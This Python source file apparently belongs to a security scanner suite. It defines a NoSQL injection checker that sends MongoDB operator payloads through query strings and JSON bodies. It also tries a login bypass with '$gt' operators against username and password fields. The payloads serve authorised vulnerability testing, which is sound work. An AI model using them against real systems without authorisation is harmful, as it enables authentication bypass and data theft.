from scan_engine.helpers.http_client import get_session
import json
import time

class NoSQLScanner:
    """
    Expert Auditor for NoSQL Injection (MongoDB, etc.).
    Focuses on JSON body and query parameter manipulation.
    """
    def __init__(self, options=None):
        self.options = options
        self.session = get_session(options)
        self.session.headers.update({"User-Agent": "RedOps3-NoSQLExpert/1.0", "Content-Type": "application/json"})
        
        # Payloads for MongoDB/JSON based injections
        self.payloads = [
            {"$gt": ""},          # Greater than
            {"$ne": "random_val"},# Not equal (classic for bypass)
            {"$regex": ".*"},     # Regex match
            {"$where": "sleep(2000)"} # Time-based (less common now in strict envs)
        ]

    def scan_endpoint(self, url, params, logger=None):
        findings = []
        if logger: logger(f"NoSQL Expert: Auditing {url} for NoSQL Injection...", "INFO")

        for param in params:
            # 1. Behavioral Check: Logical Bypass
            try:
                # Original request
                orig = self.session.get(url, params={param: "testing123"}, timeout=5)
                
                # Malicious request: Injecting a dictionary object which some frameworks (Express/Mongoose) might parse
                payload = {"$ne": "non_existent_key_999"}
                
                # Test via Query String (Some libraries like 'qs' support ?user[$ne]=val)
                qs_payload = {f"{param}[$ne]": "9999999"}
                nosql_qs = self.session.get(url, params=qs_payload, timeout=5)
                
                if nosql_qs.status_code == 200 and nosql_qs.status_code != orig.status_code:
                    findings.append({
                        "title": "NoSQL Injection (MongoDB Query Syntax)",
                        "description": f"Encountered significant response change when injecting MongoDB operators in query string.\nParam: {param}\nPayload: {qs_payload}",
                        "severity": "high",
                        "tool_source": "nosql_expert",
                        "url": url
                    })

                # Test via JSON Body (if it's a POST/PUT endpoint)
                json_payload = {param: {"$ne": "9999999"}}
                nosql_json = self.session.post(url, json=json_payload, timeout=5)
                
                if nosql_json.status_code == 200 and "id" in nosql_json.text: # Often indicates a bypass
                      findings.append({
                        "title": "NoSQL Injection (JSON Body)",
                        "description": f"Potential authentication bypass or data leakage via JSON body manipulation.\nParam: {param}\nPayload: {json_payload}",
                        "severity": "critical",
                        "tool_source": "nosql_expert",
                        "url": url
                    })

            except Exception as e:
                pass
        
        return findings

    def scan_login(self, login_url, user_param="username", pass_param="password", logger=None):
        findings = []
        try:
            # Classic login bypass payload
            payload = {
                user_param: {"$gt": ""},
                pass_param: {"$gt": ""}
            }
            resp = self.session.post(login_url, json=payload, timeout=5)
            
            # If we get a 200 or 302 and we didn't provide a valid password
            if resp.status_code in [200, 302] and len(resp.text) > 0:
                # Check if we were redirected to a dashboard or got a session cookie
                if any(k in resp.url.lower() for k in ["dashboard", "home", "profile", "account"]) or "session" in str(resp.cookies).lower():
                    findings.append({
                        "title": "NoSQL Login Bypass (CRITICAL)",
                        "description": f"Successfully bypassed login at {login_url} using MongoDB $gt operators.",
                        "severity": "critical",
                        "tool_source": "nosql_expert",
                        "url": login_url
                    })
                    if logger: logger(f"CRITICAL: NoSQL Login Bypass confirmed on {login_url}", "CRITICAL")
        except Exception:
            pass
        return findings
